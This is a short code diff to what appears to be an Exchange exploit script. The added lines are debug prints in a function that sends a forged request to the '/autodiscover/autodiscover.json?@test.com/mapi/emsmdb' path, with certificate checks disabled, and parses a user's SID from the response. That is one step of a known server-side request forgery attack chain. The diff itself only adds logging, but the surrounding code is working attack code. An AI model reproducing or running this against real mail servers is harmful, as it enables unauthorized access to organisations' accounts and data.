@@ -148,8 +148,14 @@ def get_sid(url: str, email: str):
     }
     print("[-] Getting User SID")
     sid_endpoint = url + f"/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"
+    print("[+] Sending request to: ", sid_endpoint)
+    print("[+] Data: ", data)
+    print("[+] Headers: ", headers)
+    print("[+] Content-Length: ", len(data))
     resp = requests.post(sid_endpoint, data=data,
                          headers=headers, verify=False)
+    print(resp.text)
+    print("[+] Response: ", resp.text)
     sid = resp.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
     print("[+] Successfully get User SID")
     return sid
